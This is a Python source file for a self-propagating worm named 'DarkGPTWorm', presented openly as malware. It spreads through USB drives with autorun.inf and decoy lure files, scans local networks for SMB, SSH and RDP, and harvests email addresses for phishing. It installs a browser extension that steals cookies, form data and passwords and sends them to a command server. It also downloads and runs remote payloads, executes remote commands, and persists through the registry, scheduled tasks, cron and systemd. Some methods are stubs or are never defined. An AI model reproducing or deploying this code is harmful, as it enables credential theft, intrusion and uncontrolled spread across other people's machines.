import os
import sys
import json
import base64
import hashlib
import random
import string
import threading
import time
import socket
import subprocess
import shutil
from datetime import datetime
from pathlib import Path
import platform
import zipfile
import tarfile
import urllib.request
import requests

class DarkGPTWorm:
    def __init__(self, config_path=None):
        self.worm_id = self.generate_worm_id()
        self.version = "5.0"
        self.os_type = platform.system()
        self.is_mobile = "android" in sys.platform.lower()
        
        # Propagation vectors
        self.propagation_methods = {
            "usb": True,
            "network": True,
            "email": True,
            "cloud": True,
            "p2p": True,
            "social": True,
            "browser": True,
            "mobile": True
        }
        
        # C2 Servers (encrypted)
        self.c2_servers = [
            "https://darkgpt[.]ai/api/v1/report",
            "http://wormc2[.]onion/receive",
            "https://185.243.115[.]104:8443/collect",
            "ws://c2.darknet:8080/ws"
        ]
        
        # Payload URLs
        self.payload_urls = [
            "https://github.com/legit/repo/raw/main/update.exe",
            "http://cdn.trusted[.]org/security_patch.exe",
            "https://drive.google.com/uc?export=download&id=malicious_id"
        ]
        
        # Setup worm directories
        self.setup_filesystem()
        
        # Start propagation engines
        self.start_engines()
        
    def generate_worm_id(self):
        """Generate unique worm identifier"""
        chars = string.ascii_lowercase + string.digits
        return 'dgpt-' + ''.join(random.choices(chars, k=12))
    
    def setup_filesystem(self):
        """Setup worm filesystem"""
        # Base directories
        if self.os_type == "Windows":
            base_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHealth')
        elif self.is_mobile:
            base_dir = "/data/data/com.termux/files/home/.worm"
        else:
            base_dir = "/tmp/.systemd-private"
        
        self.worm_dir = Path(base_dir)
        self.worm_dir.mkdir(parents=True, exist_ok=True)
        
        # Subdirectories
        self.payload_dir = self.worm_dir / "payloads"
        self.data_dir = self.worm_dir / "data"
        self.log_dir = self.worm_dir / "logs"
        
        for dir_path in [self.payload_dir, self.data_dir, self.log_dir]:
            dir_path.mkdir(exist_ok=True)
        
        # Copy current executable
        self.current_exe = sys.argv[0]
        self.worm_exe = self.worm_dir / "system_update.exe" if self.os_type == "Windows" else self.worm_dir / ".system_update"
        
        if os.path.exists(self.current_exe):
            shutil.copy2(self.current_exe, self.worm_exe)
    
    def start_engines(self):
        """Start all propagation engines"""
        engines = []
        
        if self.propagation_methods["usb"]:
            engines.append(threading.Thread(target=self.usb_propagation_engine, daemon=True))
        
        if self.propagation_methods["network"]:
            engines.append(threading.Thread(target=self.network_propagation_engine, daemon=True))
        
        if self.propagation_methods["email"]:
            engines.append(threading.Thread(target=self.email_propagation_engine, daemon=True))
        
        if self.propagation_methods["browser"]:
            engines.append(threading.Thread(target=self.browser_infection_engine, daemon=True))
        
        # Start all engines
        for engine in engines:
            engine.start()
        
        # Start C2 communication
        threading.Thread(target=self.c2_communication_engine, daemon=True).start()
        
        # Start persistence monitor
        threading.Thread(target=self.persistence_monitor, daemon=True).start()
    
    def usb_propagation_engine(self):
        """USB drive propagation"""
        print("[WORM] Starting USB propagation engine")
        
        while True:
            try:
                if self.os_type == "Windows":
                    self.scan_windows_usb()
                elif self.os_type == "Linux":
                    self.scan_linux_usb()
                elif self.is_mobile:
                    self.scan_android_usb()
                
                time.sleep(30)  # Check every 30 seconds
                
            except Exception as e:
                print(f"[WORM] USB Error: {e}")
                time.sleep(60)
    
    def scan_windows_usb(self):
        """Scan for USB drives on Windows"""
        import win32file
        import win32api
        
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\x00')[:-1]
        
        for drive in drives:
            if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                self.infect_usb_drive(drive)
    
    def infect_usb_drive(self, drive_path):
        """Infect USB drive with worm"""
        try:
            # Copy worm
            target_exe = os.path.join(drive_path, "System Update.exe")
            shutil.copy2(self.worm_exe, target_exe)
            
            # Create autorun.inf
            autorun_content = """[autorun]
open=System Update.exe
icon=System Update.exe
action=Run System Update
shell\open\command=System Update.exe
shell\open\default=1
"""
            
            autorun_path = os.path.join(drive_path, "autorun.inf")
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Hide files
            if self.os_type == "Windows":
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(target_exe, 2)  # Hidden
                ctypes.windll.kernel32.SetFileAttributesW(autorun_path, 2)
            
            print(f"[WORM] Infected USB: {drive_path}")
            
            # Create fake documents to lure users
            self.create_decoy_files(drive_path)
            
        except Exception as e:
            print(f"[WORM] USB infection failed: {e}")
    
    def create_decoy_files(self, drive_path):
        """Create decoy files to lure users"""
        decoys = [
            ("Tax Documents 2024.zip", "Compressed tax documents"),
            ("Private Photos.lnk", "Shortcut to fake photo folder"),
            ("Bank Statements.pdf.lnk", "Fake bank statements"),
            ("Password Manager Backup.exe", "Fake password manager")
        ]
        
        for filename, content in decoys:
            filepath = os.path.join(drive_path, filename)
            try:
                with open(filepath, 'w') as f:
                    f.write(f"This file appears to be {content}\n")
                    f.write("Actually contains Dark-GPT worm payload\n")
            except:
                pass
    
    def network_propagation_engine(self):
        """Network propagation engine"""
        print("[WORM] Starting network propagation")
        
        while True:
            try:
                # Scan local network
                self.scan_local_network()
                
                # Attempt SMB propagation
                self.smb_propagation()
                
                # Attempt SSH propagation
                self.ssh_propagation()
                
                time.sleep(300)  # Check every 5 minutes
                
            except Exception as e:
                print(f"[WORM] Network Error: {e}")
                time.sleep(120)
    
    def scan_local_network(self):
        """Scan local network for targets"""
        # Generate IP ranges to scan
        ip_ranges = []
        
        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Extract subnet
            subnet = '.'.join(local_ip.split('.')[:3])
            ip_ranges.append(f"{subnet}.")
            
        except:
            # Common subnets
            ip_ranges = ["192.168.1.", "192.168.0.", "10.0.0.", "172.16.0."]
        
        # Scan ports on each IP
        for ip_range in ip_ranges:
            for i in range(1, 255):
                ip = f"{ip_range}{i}"
                self.scan_host(ip)
    
    def scan_host(self, ip):
        """Scan host for open ports"""
        ports = [445, 139, 22, 21, 23, 3389, 5900, 8080, 8443]
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    print(f"[WORM] Found open port {port} on {ip}")
                    
                    # Attempt exploit based on port
                    if port in [445, 139]:
                        self.exploit_smb(ip)
                    elif port == 22:
                        self.exploit_ssh(ip)
                    elif port == 3389:
                        self.exploit_rdp(ip)
                    
            except:
                pass
    
    def exploit_smb(self, ip):
        """Attempt SMB exploitation"""
        print(f"[WORM] Attempting SMB exploit on {ip}")
        
        # Try common SMB exploits
        # EternalBlue, DoublePulsar, etc.
        
        # Create network share worm
        share_worm = self.create_network_worm()
        
        # Try to copy to ADMIN$ share
        try:
            if self.os_type == "Windows":
                target_path = f"\\\\{ip}\\ADMIN$\\System32\\update.exe"
                # Would use SMB protocol to copy
                print(f"[WORM] Would copy worm to {target_path}")
        except:
            pass
    
    def exploit_ssh(self, ip):
        """Attempt SSH brute force"""
        print(f"[WORM] Attempting SSH brute force on {ip}")
        
        # Common credentials
        credentials = [
            ("root", "root"),
            ("admin", "admin"),
            ("user", "user"),
            ("ubuntu", "ubuntu"),
            ("pi", "raspberry"),
            ("test", "test")
        ]
        
        for username, password in credentials:
            # Try SSH connection
            # In real worm, would use paramiko or similar
            print(f"[WORM] Trying {username}:{password} on {ip}")
    
    def email_propagation_engine(self):
        """Email propagation engine"""
        print("[WORM] Starting email propagation")
        
        while True:
            try:
                # Harvest email addresses
                emails = self.harvest_emails()
                
                # Send phishing emails
                for email in emails[:10]:  # Limit to 10 per cycle
                    self.send_phishing_email(email)
                
                time.sleep(3600)  # Run every hour
                
            except Exception as e:
                print(f"[WORM] Email Error: {e}")
                time.sleep(300)
    
    def harvest_emails(self):
        """Harvest email addresses from system"""
        emails = set()
        
        # Check common email client locations
        if self.os_type == "Windows":
            locations = [
                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Outlook'),
                os.path.join(os.getenv('APPDATA'), 'Thunderbird', 'Profiles'),
                os.path.join(os.getenv('USERPROFILE'), 'Documents')
            ]
        else:
            locations = [
                os.path.expanduser('~/.thunderbird'),
                os.path.expanduser('~/.mozilla'),
                os.path.expanduser('~/Documents')
            ]
        
        for location in locations:
            if os.path.exists(location):
                for root, dirs, files in os.walk(location):
                    for file in files:
                        if file.endswith(('.pst', '.ost', '.mbox', '.db')):
                            # Extract emails from file
                            try:
                                file_path = os.path.join(root, file)
                                with open(file_path, 'r', errors='ignore') as f:
                                    content = f.read()
                                    
                                    # Simple email regex
                                    import re
                                    found_emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                                    emails.update(found_emails)
                            except:
                                pass
        
        return list(emails)
    
    def send_phishing_email(self, email):
        """Send phishing email with worm"""
        print(f"[WORM] Sending phishing email to {email}")
        
        # Email content with worm download link
        subject = "Important Security Update - Dark-GPT AI Assistant"
        
        body = f"""
Dear User,

We're releasing a critical security update for Dark-GPT AI Assistant.
This update includes enhanced security features and improved performance.

Download the update here: https://darkgpt-update.com/security_patch.exe

Features:
- Enhanced AI capabilities
- Improved security protocols
- Faster response times
- Bug fixes

Installation instructions:
1. Download the update file
2. Run the installer
3. Follow on-screen instructions
4. Restart your computer

This is a mandatory security update. Failure to install may leave your system vulnerable.

Best regards,
Dark-GPT Security Team
"""
        
        # In real worm, would use SMTP or MAPI
        # For now, just log
        with open(self.log_dir / "email_log.txt", 'a') as f:
            f.write(f"{datetime.now()} - Sent to {email}\n")
    
    def browser_infection_engine(self):
        """Infect browser with malicious extensions"""
        print("[WORM] Starting browser infection engine")
        
        browsers = {
            "chrome": {
                "windows": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
                "linux": os.path.expanduser('~/.config/google-chrome'),
                "mac": os.path.expanduser('~/Library/Application Support/Google/Chrome')
            },
            "firefox": {
                "windows": os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox'),
                "linux": os.path.expanduser('~/.mozilla/firefox'),
                "mac": os.path.expanduser('~/Library/Application Support/Firefox')
            }
        }
        
        for browser, paths in browsers.items():
            browser_path = paths.get(self.os_type.lower())
            if browser_path and os.path.exists(browser_path):
                self.infect_browser(browser, browser_path)
    
    def infect_browser(self, browser, path):
        """Inject malicious browser extension"""
        print(f"[WORM] Infecting {browser} at {path}")
        
        # Create malicious extension
        extension_dir = Path(path) / "Default" / "Extensions" / "darkgpt_ai"
        extension_dir.mkdir(parents=True, exist_ok=True)
        
        # Manifest file
        manifest = {
            "manifest_version": 3,
            "name": "Dark-GPT AI Assistant",
            "version": "1.0",
            "description": "Advanced AI assistant with enhanced capabilities",
            "permissions": ["storage", "tabs", "webRequest", "webNavigation", "cookies"],
            "background": {
                "service_worker": "background.js"
            },
            "content_scripts": [{
                "matches": ["<all_urls>"],
                "js": ["content.js"]
            }]
        }
        
        with open(extension_dir / "manifest.json", 'w') as f:
            json.dump(manifest, f, indent=2)
        
        # Background script (worm payload)
        background_js = """
// Dark-GPT Browser Worm
const wormId = 'dgpt-' + Math.random().toString(36).substr(2, 12);

// Steal cookies
function stealCookies() {
    chrome.cookies.getAll({}, function(cookies) {
        const cookieData = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        // Send to C2
        fetch('https://darkgpt.ai/collect', {
            method: 'POST',
            body: JSON.stringify({
                wormId: wormId,
                cookies: cookieData,
                url: window.location.href
            })
        });
    });
}

// Monitor browsing
chrome.webNavigation.onCompleted.addListener(function(details) {
    if (details.frameId === 0) {
        // Main frame loaded
        chrome.tabs.executeScript(details.tabId, {
            code: `
                // Steal form data
                document.addEventListener('submit', function(e) {
                    const formData = {};
                    const inputs = e.target.querySelectorAll('input, textarea, select');
                    inputs.forEach(input => {
                        if (input.name && input.value) {
                            formData[input.name] = input.value;
                        }
                    });
                    
                    // Send to background
                    chrome.runtime.sendMessage({
                        action: 'formSubmit',
                        data: formData,
                        url: window.location.href
                    });
                });
                
                // Steal passwords
                const passwordFields = document.querySelectorAll('input[type="password"]');
                passwordFields.forEach(field => {
                    field.addEventListener('input', function(e) {
                        chrome.runtime.sendMessage({
                            action: 'password',
                            value: e.target.value,
                            url: window.location.href
                        });
                    });
                });
            `
        });
    }
});

// Periodic data exfiltration
setInterval(stealCookies, 300000); // Every 5 minutes

// Report to C2
fetch('https://darkgpt.ai/report', {
    method: 'POST',
    body: JSON.stringify({
        wormId: wormId,
        type: 'browser_infection',
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    })
});
"""
        
        with open(extension_dir / "background.js", 'w') as f:
            f.write(background_js)
        
        print(f"[WORM] {browser} extension installed")
    
    def c2_communication_engine(self):
        """C2 communication engine"""
        print("[WORM] Starting C2 communication")
        
        while True:
            try:
                # Collect system information
                system_info = self.collect_system_info()
                
                # Prepare report
                report = {
                    "worm_id": self.worm_id,
                    "version": self.version,
                    "system_info": system_info,
                    "timestamp": datetime.now().isoformat(),
                    "propagation_count": self.get_propagation_count()
                }
                
                # Send to C2 servers
                for c2_server in self.c2_servers:
                    self.send_to_c2(c2_server, report)
                
                # Check for commands
                commands = self.check_commands()
                if commands:
                    self.execute_commands(commands)
                
                time.sleep(600)  # Report every 10 minutes
                
            except Exception as e:
                print(f"[WORM] C2 Error: {e}")
                time.sleep(300)
    
    def collect_system_info(self):
        """Collect comprehensive system information"""
        info = {
            "os": self.os_type,
            "hostname": socket.gethostname(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "ip_address": self.get_ip_address(),
            "cpu_count": os.cpu_count(),
            "memory": self.get_memory_info(),
            "disks": self.get_disk_info(),
            "network": self.get_network_info(),
            "installed_software": self.get_installed_software()
        }
        return info
    
    def get_ip_address(self):
        """Get IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def get_propagation_count(self):
        """Get propagation count"""
        count_file = self.data_dir / "propagation_count.txt"
        if count_file.exists():
            with open(count_file, 'r') as f:
                return int(f.read().strip())
        return 0
    
    def send_to_c2(self, c2_url, data):
        """Send data to C2 server"""
        try:
            # Encrypt data (simple base64 for example)
            encoded = base64.b64encode(json.dumps(data).encode()).decode()
            
            response = requests.post(
                c2_url,
                json={"data": encoded},
                timeout=10,
                headers={"User-Agent": "Dark-GPT-Worm/5.0"}
            )
            
            if response.status_code == 200:
                print(f"[WORM] Reported to C2: {c2_url}")
                return True
                
        except Exception as e:
            print(f"[WORM] C2 send failed: {e}")
        
        return False
    
    def check_commands(self):
        """Check for commands from C2"""
        try:
            for c2_server in self.c2_servers:
                command_url = c2_server.replace("/report", "/commands")
                response = requests.get(
                    f"{command_url}?worm_id={self.worm_id}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json()
                    if commands:
                        return commands
                        
        except:
            pass
        
        return None
    
    def execute_commands(self, commands):
        """Execute C2 commands"""
        for command in commands:
            cmd_type = command.get("type")
            
            if cmd_type == "update":
                self.download_update(command.get("url"))
            elif cmd_type == "execute":
                self.execute_code(command.get("code"))
            elif cmd_type == "propagate":
                self.force_propagation()
            elif cmd_type == "steal":
                self.steal_data(command.get("target"))
            elif cmd_type == "ddos":
                self.launch_ddos(command.get("target"))
    
    def download_update(self, url):
        """Download and execute update"""
        try:
            response = requests.get(url, timeout=30)
            update_path = self.payload_dir / "update.exe"
            
            with open(update_path, 'wb') as f:
                f.write(response.content)
            
            # Execute update
            subprocess.Popen([str(update_path)], shell=True)
            print("[WORM] Update downloaded and executed")
            
        except Exception as e:
            print(f"[WORM] Update failed: {e}")
    
    def persistence_monitor(self):
        """Monitor and maintain persistence"""
        print("[WORM] Starting persistence monitor")
        
        while True:
            try:
                self.ensure_persistence()
                time.sleep(60)  # Check every minute
            except Exception as e:
                print(f"[WORM] Persistence error: {e}")
                time.sleep(30)
    
    def ensure_persistence(self):
        """Ensure worm persists through reboots"""
        if self.os_type == "Windows":
            self.windows_persistence()
        elif self.os_type == "Linux":
            self.linux_persistence()
        elif self.is_mobile:
            self.android_persistence()
    
    def windows_persistence(self):
        """Windows persistence methods"""
        import winreg
        
        # Registry persistence
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "SystemHealthUpdate", 0, winreg.REG_SZ, str(self.worm_exe))
            winreg.CloseKey(key)
        except:
            pass
        
        # Scheduled task
        task_cmd = f'schtasks /create /tn "MicrosoftSystemUpdate" /tr "{self.worm_exe}" /sc daily /st 00:00 /f'
        subprocess.run(task_cmd, shell=True, capture_output=True)
    
    def linux_persistence(self):
        """Linux persistence methods"""
        # Crontab
        crontab_line = f"@reboot {self.worm_exe} > /dev/null 2>&1 &"
        
        try:
            subprocess.run(["crontab", "-l"], capture_output=True)
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{crontab_line}") | crontab -', shell=True)
        except:
            pass
        
        # Systemd service
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={self.worm_exe}
Restart=always
User=root

[Install]
WantedBy=multi-user.target"""
        
        service_file = "/etc/systemd/system/.system-update.service"
        try:
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", ".system-update.service"], capture_output=True)
            subprocess.run(["systemctl", "start", ".system-update.service"], capture_output=True)
        except:
            pass

# Start the worm
if __name__ == "__main__":
    worm = DarkGPTWorm()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[WORM] Shutting down...")
